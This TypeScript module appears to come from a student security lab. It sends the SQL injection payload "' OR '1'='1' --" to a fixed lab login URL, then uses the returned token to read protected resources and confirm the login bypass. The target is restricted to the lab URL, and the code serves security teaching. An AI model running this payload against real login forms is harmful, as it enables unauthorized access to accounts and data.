import { LAB, InputError, exact } from '../config.js';
import { status } from '../services/telemetry.service.js';

async function readJson(response: Response) {
  return await response.json() as Record<string, unknown>;
}

export async function runSqlInjectionAttack(
  targetUrl: unknown = LAB.loginUrl,
  payload: unknown = "' OR '1'='1' --"
) {
  exact(targetUrl, LAB.loginUrl, 'targetUrl');
  if (typeof payload !== 'string' || payload.length < 1 || payload.length > 128) {
    throw new InputError('payload must be a string of 1-128 characters');
  }

  status('SQL_INJECTION', 'RUNNING', `[SQLi] Gửi payload tới ${LAB.loginUrl}`, { payload });

  try {
    const loginResponse = await fetch(LAB.loginUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: payload, password: 'pbl4-invalid-password' }),
      redirect: 'error',
      signal: AbortSignal.timeout(5000)
    });
    const loginData = await readJson(loginResponse);
    const token = typeof loginData.token === 'string' ? loginData.token : undefined;

    let resourceStatus: number | undefined;
    let resourceCount = 0;
    if (loginResponse.ok && token) {
      const resourceResponse = await fetch(LAB.resourcesUrl, {
        headers: { Authorization: `Bearer ${token}` },
        redirect: 'error',
        signal: AbortSignal.timeout(5000)
      });
      const resourceData = await readJson(resourceResponse);
      resourceStatus = resourceResponse.status;
      resourceCount = Array.isArray(resourceData.data) ? resourceData.data.length : 0;
    }

    const success = loginResponse.ok && Boolean(token) && resourceStatus === 200;
    status(
      'SQL_INJECTION',
      'COMPLETED',
      success ? '[SQLi] Đã xác minh bỏ qua đăng nhập và đọc tài nguyên' : '[SQLi] Không bỏ qua được đăng nhập',
      {
        payload,
        success,
        loginStatus: loginResponse.status,
        resourceStatus,
        resourceCount,
        user: loginData.user
      },
      success ? 'DANGER' : 'WARNING'
    );

    return {
      success,
      loginStatus: loginResponse.status,
      resourceStatus,
      resourceCount,
      user: loginData.user,
      labRestricted: true
    };
  } catch (error) {
    status('SQL_INJECTION', 'FAILED', `[SQLi] ${(error as Error).message}`);
    throw error;
  }
}
